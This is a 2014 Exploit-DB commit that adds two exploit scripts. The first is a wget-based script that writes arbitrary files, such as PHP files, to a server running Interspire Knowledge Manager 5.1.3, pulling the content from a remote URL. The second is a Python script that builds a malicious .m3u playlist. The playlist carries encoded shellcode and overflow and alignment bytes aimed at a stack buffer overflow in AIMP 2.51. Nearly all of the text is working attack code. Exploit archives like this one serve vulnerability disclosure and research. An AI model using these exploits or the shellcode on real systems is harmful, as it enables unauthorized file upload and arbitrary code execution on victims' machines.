e97b490546645a900040f96ae82e3ece489958ad
Offensive Security <info@exploit-db.com>
2014-06-05 04:36:35 +0000

    Updated 06_05_2014

---
+++ platforms/php/webapps/33636.sh
@@ -0,0 +1,28 @@
+source: http://www.securityfocus.com/bid/38186/info
+
+Interspire Knowledge Manager is prone to a vulnerability that allows attackers to create arbitrary files on a vulnerable computer.
+
+An attacker may exploit this issue to create arbitrary files, which may then be executed to perform unauthorized actions. This may aid in further attacks.
+
+Knowledge Manager 5.1.3 is vulnerable; other versions may also be affected. 
+
+# #!/bin/sh
+# echo "$0 <target_url> <relative_path_from_admin_dir> <file_name>
+<content_url>
+# example: $0 http://target.com/knowledge_base ../../../ file.php
+http://source
+# if kb is installed at knowledge_base, then the file: file.php will be
+# created in the base application directory from the content at
+http://source
+# "
+# sessionUrl=$1'/admin/de/dialog/file_manager.php'
+# uploadUrl=$1'/admin/de/dialog/callback.snipshot.php'
+# wget -O r1 --save-cookies tmp.cookies --keep-session-cookies
+"$sessionUrl?userdocroot=$2&imgDir=&obj=1"
+# echo "session created, setting file name $2$3"
+# wget -O r2 --keep-session-cookies --load-cookies tmp.cookies
+"$uploadUrl?action=step1&source_image=name&save_file_as=$3"
+# echo "upload content from: $4 ..."
+# wget -O r3 --keep-session-cookies --load-cookies tmp.cookies
+"$uploadUrl?action=step2&source_image=name&save_file_as=$3&snipshot_output=$4"
+# echo "file created test access to the script at: $1/admin/de/dialog/$2$3"; 
---
+++ platforms/windows/dos/33640.py
@@ -0,0 +1,53 @@
+source: http://www.securityfocus.com/bid/38215/info
+
+AIMP is prone to a remote stack-based buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied input.
+
+Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.
+
+AIMP 2.51 is vulnerable; other versions may also be affected. 
+
+#!/usr/bin/python
+#
+# AIMP2 (aimp2c.exe) m3u malformed open file stack overflow exploit
+# Coded by :  Molotov
+#
+# Greats To : Corelanc0d3r & exploit-db
+#
+# thanks to : Simo36 & all friends
+#
+shellcode = (
+"PPYAIAIAIAIAQATAXAZAPA3QADAZABARA"
+"LAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZA"
+"BABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB"
+"KLK8U9M0M0KPS0U99UNQ8RS44KPR004K22LLDKR2MD4KCBMX"
+"LOGG0JO6NQKOP1WPVLOLQQCLM2NLMPGQ8OLMM197K2ZP22B7"
+"TK0RLPTK12OLM1Z04KOPBX55Y0D4OZKQXP0P4KOXMHTKR8MP"
+"KQJ3ISOL19TKNTTKM18VNQKONQ90FLGQ8OLMKQY7NXK0T5L4"
+"M33MKHOKSMND45JBR84K0XMTKQHSBFTKLL0KTK28MLM18S4K"
+"KT4KKQXPSYOTNDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM"
+"2JKQTMSU89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU"
+"7MEMKOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC"
+"QQ2LRCM0LJA"
+)
+header = "[playlist]\nNumberOfEntries=3\n\n"
+header += ("File1=");
+crash = 'A' * 2222
+crash+= shellcode
+crash+= 'B' * (4014-len(shellcode)-2222)
+crash+= '\x41\x6d'
+crash+= '\x0e\x45'
+align = '\x58\x6d'
+align+= '\x58\x6d'
+align+= '\x58\x6d'
+align+= '\x58\x6d'
+align+= '\x05\x01\x11\x6d'
+align+= '\x2d\x0F\x11\x6d'
+align+= '\x50\x6d\xC3'
+padd  = 'D' * 3000
+ 
+padd= 'D'*3000#n7Cn
+buffer = header + crash +align+padd +'\n'
+file=open('ss.m3u','w')
+file.write(buffer)
+file.close()
+print "[+] ss.m3u file created successfully"
